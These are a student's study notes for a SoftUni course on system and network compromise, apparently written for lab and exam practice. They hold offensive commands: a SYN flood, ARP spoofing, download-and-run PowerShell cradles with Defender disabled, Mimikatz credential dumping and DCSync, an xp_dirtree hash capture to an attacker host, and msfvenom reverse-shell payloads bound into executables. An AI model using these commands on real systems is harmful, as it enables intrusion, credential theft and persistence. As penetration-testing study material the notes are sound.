# SoftUni - System and Network Compromisig Notes

## 02. Denial of Service 

```bash
# View all open ports
netstat -ntlp
ss -nltp
# In windows
netstat -ant
```

###  Tools that can be used to perform DoS attacks

- **LOIC (Low Orbit Ion Cannon)**
- **HOIC (High Orbit Ion Cannon)**
- **hping3**

  ```sudo hping3 -S --flood -V -p 80 <target> ```

- **Tor's Hammer**
```python torshammer.py -t <target> -r <threads>```

### Other notes

```bash
# Check public IP
curl ifconfig.me
```

## 03. Scanning and Exploiting Network Services

**TODO:** Research the difference between nmap and masscan.

### Tools for scanning and exploiting network services

- **nmap**
  ```nmap -sS -sV -O -A -T4 <target>```
- **masscan**
  ```masscan -p1-65535 <target> --rate=1000```
- **Nessus**
- **OpenVAS**

```bash
# Nmap notes    
nmap -sV -O --script=default <target>
nmap -sS -sV -O -A -T4 <target>
# Running scripts
nmap -p 80 --script http-generator.nse <target>
nmap -p 443 --script=http-headers,http-title,http-generator 
nmap --script="default and http-*"
```

**TODO:** research about scripts

```bash
# Masscan notes
masscan -p1-65535 <target> --rate=1000
masscan -p80,443,8080,81,4444,8888 <target> --rate=1000
```

```netdiscover```

```bash
bettercap
net.probe one
net.show
```

### Cheatsheets

- [Nmap Cheatsheet](https://www.stationx.net/nmap-cheat-sheet/)
- [Masscan Cheatsheet](https://cheatsheet.haax.fr/network/port-scanning/masscan_cheatsheet/)
- [Netdiscover Cheatsheet](https://neverendingsecurity.wordpress.com/2015/04/07/netdiscover-cheatsheet/)
- [Bettercap Cheatsheet](https://github.com/Lifka/hacking-resources/blob/main/session-hijacking-cheat-sheet.md)

```searchsploit vsftpd```

Search for exploits in GitHub

### Password spraying

- username=password
- empty password
- company99

```Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose``` 

```bash
#MimiKatz
lsdump::setntlm /user:Audit2020 /ntlm:3a2e3f4a2e3f4a2e3f4a2e3f4a2e3f4a
```

Mythic - Web based C2 framework

```sudo -l # Check for sudo privileges```

```bash
# Filter out port from masscan
cat ... | cut -d '/' -f 1
```

## 04. Nessus Workshop

### Rooms to pass in TryHackMe

- Cross Site Scripting (XSS)
- Upload Vulnerabilities
- Nmap Live Host Discovery
- Authentication Bypass
- Active Directory Basics
- Windows Fundamentals (1-7)
- Nessus
- Active Directory (All)
- MetaSploit
- Red Team Labs (Empire)
- Red Team Fundamentals
- Apt Labs ???

## 05. Man in the Middle

### Tools

- MacChanger
- Ettercap (Bettercap)
  
  ```bash
  apt-get install bettercap
  sudo bettercap --iface eth0
  net.probe on
  set arp.spoof.duplex true
  set arp.spoof.targets 192.168.2.122
  arp.spoof on
  net.sniff on
  ```

  https://www.bettercap.org/usage/webui/
  
  ```bash
  sudo bettercap -caplet http-ui
  ```

- MITM Framework
- Driftnet
  Sniff images from network (homework)

vulnweb.com - Web application to practice web vulnerabilities

## 06. Active Directory Enumeration

- NTLM is weak to dictionary attacks
- NTLM is weak to pass the hash attacks

### General Attacking aproaches

1. Classical pentest evaluate service level vulnerabilities (metasploit, nmap, nessus)
2. Password spraying (empty PW, company99, username=password)
3. ACLs abuse

### Tools for Active Directory Enumeration

- Bloodhound (https://github.com/BloodHoundAD/BloodHound)
  - Bloodhound 4.2!!!

  ```bash
  sudo apt install neo4j
  sudo neo4j start # or sudo neo4j console
  # Navigate to http://localhost:7474
  # default credentials: neo4j:neo4j
  # Install Bloodhound
  wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-linux-x64.zip
  unzip BloodHound-linux-x64.zip
  cd BloodHound-linux-x64
  ./BloodHound --disable-gpu-sandbox&
  # 
  # On windows machine import the data
  # Download SharpHound
  https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip

  .\SharpHound.exe
  # Upload data to Bloodhound
  # On the linux machine
  pip3 install uploadserver
  python3 -m uploadserver 80
  # Upload and Import data on URL http://<linux-ip>/upload
  # Drag and drop the zip file into the bloodhound web interface
  # After upload, go to Analisis
  ```

**TODO:** Own HTB Sauna machine and use Bloodhound
  https://ippsec.rocks  - search for sauna

- WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)
- ADRecon
- MimiKatz

  ```powershell
  # Run as Administrator
  # Turn off Windows Defender
  iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn.ps1')
  # Run WinPwn
  winpwn
  # 16
  privilege::debug
  sekurlsa::logonpasswords
  # first option 3, then 2 (for password spraying)
  ```

  ```bash
  # On Kali using the hash
  impacket-psexec ...
  # Read the blog https://thehacker.recipes/ad/movement/ntlm/pth
  ```

### Repositories for VMs to practice Active Directory

- https://github.com/Orange-Cyberdefense/GOAD
- https://github.com/safebuffer/vulnerable-AD  (For weaker machines)

## 07. Active Directory Exploitation

### Tools for Active Directory Exploitation
 
- Responder

   ```bash
  sudo responder -I eth0
  ```

- impacket-mssqlclient (https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)

  ```bash
  impacket-mssqlclient 'DOMAIN/username@<target-ip>' -windows-auth
  ```

- PowerUpSQL.ps1 (https://github.com/NetSPI/PowerUpSQL)
  PowerUpSQL Cheat Sheet (https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

  ```powershell
  # On Windows
  iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')
  Get-SQLInstanceDomain
  Invoke-SQLAudit -Instance <target-ip>

  Get-SQLQuery -Instance <target-ip> -Query "EXEC master.sys.xp_dirtree '//<attacker-ip>/share',1,1"
  # On Kali if hash contains $ it means that it is for machine account
  ```

- WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)

  ```powershell
  # Run as Administrator
  # Turn off Windows Defender
  iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn. ps1')
  # Run WinPwn
  winpwn
  # 3 (Domain Recon)
  # 7 (PowerUpSQL Checks)
  ```

### Optional tools and resources

- hash_idenfier
- https://hashcat.net/wiki/doku.php?id=example_hashes 

  ```bash
  hashcat --example-hashes
  # Crack NTLMV1
  hashcat -m 5500 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
  ```

### Tools for Password Spraying

- DomainPasswordSpray (https://github.com/dafthack/DomainPasswordSpray)

  ```powershell
  # On Windows
  iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/ DomainPasswordSpray.ps1') -outfile DomainPasswordSpray.ps1
  Import-Module .\DomainPasswordSpray.ps1
  Invoke-DomainPasswordSpray -Password "password"
  ```

- O365Spray (https://github.com/0xZDH/o365spray) - Out of Scope
- WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)

  ```powershell
  # Run as Administrator
  # Turn off Windows Defender
  iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn. ps1')
  # Run WinPwn
  winpwn
  # 3 (Domain Recon)
  # 21 (Check username=password combinations!)
  ```

- TeamsFiltration (https://github.com/Flangvik/TeamFiltration)

### Local Privilege Escalation Tools

- ProtectMyTooling - Obfuscate and protect your tools from being detected by AV

- Juicy: https://github.com/ohpe/juicy-potato
- Sweet: https://github.com/CCob/SweetPotato
- Rogue: https://github.com/antonioCoco/RoguePotato
- GodPotato: https://github.com/BeichenDream/GodPotato

## 08. Active Directory Post-Exploitation

### Tools for Active Directory Post-Exploitation

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/

- winPEAS (https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- DCSync
- Mimikatz

  ```powershell
  minikatz
  privilege::debug
  sekurlsa::logonpasswords
  # Perform DCSync
  lsadump::dcsync /domain:<FQDN> /user:username
  # Dump SAM database
  lsadump::sam
  ```

- `impacket-secretsdump 'domain/username@<target-ip>' -hashes :NTLM`
- CrackMapExec

### Lateral Movement Tools

- smbexec
(https://github.com/fortra/impacket/blob/master/examples/smbexec.py)
- wmiexec
(https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)
- psexec
(https://github.com/fortra/impacket/blob/master/examples/psexec.py)
- evil-winrm (https://github.com/Hackplayers/evil-winrm)

[Optional DLL hijacking](https://lsecqt.github.io/Red-Teaming-Army/malware-development/weaponizing-dll-hijacking-via-dll-proxying/)

## 09. Exam Preparation

### Tools for Exam Preparation

- Bloodhound
- WinPwn (For the exam there will be task to analyze the output of WinPwn)
  - Discover different Password Spraying attacks
- ADRecon

### Possible Exam Tasks

- Analyze and crack hashes
- Analyze Password Spraying attacks (username = password)
- Analyze certain hash that is used by xp_dirtee
- Analyze exploit with xp_cmdshell (not that important for the exam)
- Crack NTLMv1 and NTLMv2, WPA hashes!!!
  TODO: View from lecture how to use aircrack-ng

- In theoretical envoronment - where in Windows and where in AD are the hashes stored
  SAM - C:\Windows\System32\config\SAM
  Lsass - C:\Windows\System32\lsass.exe (in memory)
  NTDS.dit - C:\Windows\NTDS\NTDS.dit
- What is the difference between Local and Domain Account?

- Understand Responder and how it works
- Linpeas and Winpeas.
- Different Potato attacks (Rouge, Sweet, Juicy) - theoretical and practical(maybe).
- Understand what is Mimikatz and how it works.
  - Credential dumping
    `privilege::debug` `sekurlsa::logonpasswords`
    `whoami /all` mandatory level high/system is needed to use Mimikatz
  - DCSync attack - domain level admin is needed
    `privilege::debug`
    `lsadump::dcsync /domain:<FQDN> /user:username`
  - DCSync with Impacket
    `impacket-secretsdump 'domain/username@<dc-ip>' -hashes :NTLM`
- Laterall movement tools
  - smbexec
  - wmiexec
  - psexec
  - evil-winrm
- Establishing persistence
  - Exe binding - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe -o evil.exe`
  - DLL hijacking - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f dll -o evil.dll`
  - Shortcut links
  - Registry Tweaks
- What is metasploit and how it works
- nmap what is the difference between -sC and -sV (sC is for scripts, sV is for version)

- Nessus - practical task to analyze the output of Nessus!!!
  - Driftnet - theoretical - homework (Man in the middle)

### Summary of needed tools

- Nessus
- Bloodhound
- aircrack-ng
- Metasploit
- Hashcat

### Exam Tasks

- Analyzing Bloodhound path
  - Finding user who can perform DCSync bit its not a domain/enterprise admin
  - Finding attak paths from specific user
- Analyzing Nessus Findings (search for public exploits)
- Crack hashes with Hashcat
- Crack WiFi password with aircrack-ng
- Analyzing vulnerabilities for local privilege escalation
  - Analyzing WinPEAS, WinPwn, LinPEAS output for potential privesc vectors
- Performing EXE binding
  `msfvenom -x ncat.exe -p windows/x64/reverse_tcp LHOST=eth0 LPORT=443 -f exe -o ncat_modified.exe`